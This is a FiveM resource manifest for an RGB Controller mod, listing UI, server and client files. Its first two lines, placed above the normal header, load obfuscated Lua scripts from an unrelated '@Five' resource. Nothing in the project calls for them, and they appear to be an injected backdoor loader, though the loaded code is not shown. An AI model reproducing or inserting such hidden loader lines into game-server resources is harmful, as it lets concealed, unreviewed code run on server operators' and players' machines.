shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version 'cerulean'
games      { 'gta5' }
lua54 'yes'

author 'KuzQuality | Kuzkay'
description 'RGB Controller made by KuzQuality'
version '1.0.2'


ui_page 'html/index.html'

--
-- Files
--

files {
    'html/js/jquery.js',
    'html/farbtastic/farbtastic.js',
    'html/farbtastic/farbtastic.css',
    'html/fonts/bebasneue.ttf',
    'html/farbtastic/*.png',
    'html/index.html',
}


--
-- Server
--

server_scripts {
    'shared/config.lua',
    'server/server.lua',
}

--
-- Client
--

client_scripts {
    'shared/config.lua',
    'client/client.lua',
}

escrow_ignore {
    'shared/config.lua',
    'server/server.lua',
}
dependency '/assetpacks'